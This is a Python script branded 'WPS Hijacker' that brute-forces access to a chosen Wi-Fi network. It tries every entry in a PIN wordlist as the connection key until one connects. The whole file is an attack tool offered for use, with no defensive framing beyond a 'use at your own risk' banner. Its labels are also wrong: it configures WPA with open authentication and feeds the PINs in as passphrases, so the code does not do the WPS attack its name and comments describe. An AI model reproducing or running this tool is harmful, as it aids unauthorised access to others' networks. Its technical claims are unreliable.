import pywifi
from pywifi import const
import time
import pyfiglet

# Create ASCII art banner with "WPS Hijacker"
banner = pyfiglet.figlet_format("WPS Hijacker", font="doom")
print(banner)

# Display a warning message for danger
print("\033[91mWARNING: Potential Danger! Use at Your Own Risk!\033[0m")

def test_wps_pin(interface, ssid, pin):
    # Create a Wi-Fi profile
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN  # Open authentication
    profile.akm.append(const.AKM_TYPE_WPA)  # Use WPS
    profile.key = pin

    # Remove all profiles and add our test profile
    interface.remove_all_network_profiles()
    test_profile = interface.add_network_profile(profile)

    # Try to connect
    interface.connect(test_profile)
    time.sleep(5)  # Wait for connection

    # Check if connected
    if interface.status() == const.IFACE_CONNECTED:
        print(f"[+] WPS PIN '{pin}' works on SSID '{ssid}'!")
        interface.disconnect()
        return True
    else:
        print(f"[-] WPS PIN '{pin}' failed on SSID '{ssid}'.")
        interface.disconnect()
        time.sleep(1)
        return False

def pentest_wps(ssid,wordlist):
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]  # Use the first Wi-Fi interface

    if interface.status() == const.IFACE_CONNECTED:
        print("[*] Disconnecting current connection...")
        interface.disconnect()
        time.sleep(1)

    print(f"[*] Starting WPS PIN pentest on SSID: {ssid}")

    with open(wordlist, "r") as file:
        for line in file:
            pin = line.strip()
            if test_wps_pin(interface, ssid, pin):
                print("[*] WPS PIN Pentest Successful!")
                break
        else:
            print("[!] No working WPS PIN found.")

# User inputs
ssid = input("Enter the Wi-Fi SSID: ")
wordlist = input("Enter the path to your WPS PIN wordlist: ")

# Call the function
pentest_wps(ssid,wordlist)